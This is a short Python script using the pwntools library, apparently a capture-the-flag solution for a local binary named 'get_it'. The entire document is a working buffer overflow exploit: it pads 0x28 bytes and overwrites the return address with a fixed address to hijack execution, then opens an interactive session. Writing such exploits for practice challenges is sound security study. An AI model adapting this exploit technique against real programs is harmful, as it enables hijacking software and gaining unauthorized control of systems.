from pwn import *

target = process('./get_it')


payload = b'\x00'*0x28 + p64(0x4005b6)


target.sendline(payload)

target.interactive()
